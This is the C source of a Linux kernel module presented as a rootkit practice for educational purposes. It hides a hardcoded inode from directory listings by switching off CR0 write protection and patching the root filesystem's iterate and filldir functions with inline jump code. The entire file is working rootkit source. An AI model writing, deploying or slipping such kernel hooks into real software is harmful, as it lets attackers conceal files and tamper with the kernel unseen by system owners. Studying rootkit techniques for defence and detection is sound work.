/**
 * rootkit
 * */

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/fs.h>


#if defined(__i386__)
#define code_size 6
#define jack_code "\x68\x00\x00\x00\x00\xc3"
#define load_fp_size 1
#define call_fp_size 1

#else
#define code_size 12
#define jack_code "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
#define load_fp_size 2
#define call_fp_size 2

#endif


static struct file_operations origin;

typedef struct {
    unsigned char load_fp[load_fp_size]; //load code
    void *fp __attribute__((packed)); // hook function pointer
    unsigned char call_fp[call_fp_size]; //call fp
} hijack_pack_t;

struct hook_node {
    void *hooked_fp;

    hijack_pack_t hijack_code;

    unsigned char o_code[code_size]; //origin code
    struct list_head list;
};

static LIST_HEAD(hook_pool);


static inline struct hook_node *find_hook_node (void *fp) {
    struct hook_node *nd;
    
    list_for_each_entry (nd, &hook_pool, list) {
        if (nd->hooked_fp == fp)
            return nd;
    }

    printk("!QAQ!");

    return NULL;
}


static inline unsigned long disable_wp(void) {
    unsigned long cr0;
    
    barrier();
    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);

    return cr0;
}

static inline void restore_wp(unsigned long cr0) {
    write_cr0(cr0 | X86_CR0_WP);
    barrier();
}

static void hijack_fp(struct hook_node *nd) {
    unsigned long o_cr0;
    
    if (nd == NULL) {
        printk ("FATAL BUG!!!");
        return;
    }

    preempt_disable();

    o_cr0  = disable_wp();
    memcpy (nd->hooked_fp, &nd->hijack_code, code_size);
    restore_wp (o_cr0);
    
    preempt_enable();
}

static void resume_fp(struct hook_node *nd) {
    unsigned long o_cr0;
    
    if (nd == NULL) {
        printk ("FATAL BUG!!!");
        return;
    }

    preempt_disable();
    
    o_cr0 = disable_wp();
    memcpy (nd->hooked_fp, nd->o_code, code_size);
    restore_wp (o_cr0);

    preempt_enable();
}

static u64 hide_inode = 3675405ULL;


static void register_hook (void *dest, void *new) {
    struct hook_node *nd;
    unsigned char tmp[code_size];
    int i;

    nd = kmalloc (sizeof (struct hook_node), GFP_KERNEL);

    memcpy (&nd->hijack_code, jack_code, code_size);
    memcpy (nd->o_code, dest, code_size);
    
    nd->hooked_fp = dest;
    nd->hijack_code.fp = new;

    list_add (&nd->list, &hook_pool);

    memcpy (tmp, &nd->hijack_code, code_size);
    
    hijack_fp(nd);
}

static filldir_t o_filldir;

static int root_filldir (struct dir_context *ctx,
        const char *name, int len, loff_t offset, u64 ino, unsigned d_type) {
    int ret;
    struct hook_node *nd = find_hook_node (o_filldir);
    
    printk ("filldir hook!\n");

    if (ino == hide_inode)
        return 0;

    resume_fp (nd);

    ret = o_filldir(ctx, name, len, offset, ino, d_type);

    hijack_fp (nd);
    

    return ret;
}

//static struct dir_context root_ctx = {
//    .actor = root_filldir
//};

static int rootkit_iterate (struct file *file, struct dir_context *ctx) {
    int ret;
    struct hook_node *nd = find_hook_node(origin.iterate);
    struct hook_node *ctx_nd = NULL;
    
    if (nd == NULL)
        return 0;

    resume_fp (nd);

    o_filldir = ctx->actor;

    ctx_nd = find_hook_node (o_filldir);

    printk ("origin filldir addr : %p\n", o_filldir);
    
    if (ctx_nd == NULL && o_filldir != NULL)
        register_hook (o_filldir, root_filldir);
        
    ret = origin.iterate(file, ctx);
    
    hijack_fp (nd);

    printk ("hook ret :%d\n", ret);

    return ret;
}

static int get_file_op(const char *path) {
    struct file *f = NULL;

    printk ("get_file_op.\n");

    if ((f = filp_open (path, O_RDONLY, 0)) == NULL) 
        return 0;

    memcpy (&origin, f->f_op, sizeof (struct file_operations));

    printk ("iterate fp : %p %p\n", origin.iterate, f->f_op->iterate);
    
    filp_close (f, 0);

    printk ("iterate fp : %p\n", origin.iterate);

    return 1;
}


int rootkit_init(void) {
    printk ("rootkit module load!\n");
    
    // check packed succeed
    printk ("load offset :%lu %lu %lu\n",
            offsetof(hijack_pack_t, load_fp),
            offsetof(hijack_pack_t, fp),
            offsetof(hijack_pack_t, call_fp));

    if (get_file_op("/")) 
        register_hook (origin.iterate, rootkit_iterate);
    
    return 0;
}

void rootkit_exit(void) {
    struct hook_node *nd, *tmp;


    printk ("cleanup hook pool:\n");
    list_for_each_entry_safe (nd, tmp, &hook_pool, list) {
        printk ("unregister fp : %p\n", nd->hooked_fp);
        resume_fp (nd);

        list_del (&nd->list);
        kfree (nd);
    }
    
    printk ("rootkit module unload!\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("firejox");
MODULE_DESCRIPTION("Rootkit pratice. For educational purpose.\n");
